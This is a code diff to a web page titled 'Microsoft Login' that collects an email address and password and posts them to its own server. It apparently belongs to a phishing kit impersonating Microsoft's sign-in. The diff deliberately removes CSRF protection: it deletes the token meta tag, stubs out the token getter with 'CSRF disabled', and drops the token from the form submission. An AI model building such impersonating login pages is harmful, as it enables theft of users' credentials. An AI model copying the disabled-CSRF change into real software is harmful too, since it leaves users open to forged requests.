@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="csrf-token" content="{{ csrf_token() }}">
+    
     <title>Microsoft Login</title>
     <style>
         body {
@@ -112,8 +112,7 @@
     let isProcessing = false;
 
     function getCsrfToken() {
-        const metaToken = document.querySelector('meta[name="csrf-token"]');
-        return metaToken ? metaToken.getAttribute('content') : '';
+        return ''; // CSRF disabled
     }
 
     function validateEmail(email) {
@@ -254,10 +253,7 @@
         formData.append('password', currentPassword);
         formData.append('submit', 'Sign in');
         
-        const csrfToken = getCsrfToken();
-        if (csrfToken) {
-            formData.append('csrf_token', csrfToken);
-        }
+        // CSRF token not needed since protection is disabled
 
         console.log('Submitting credentials for:', currentEmail);
 
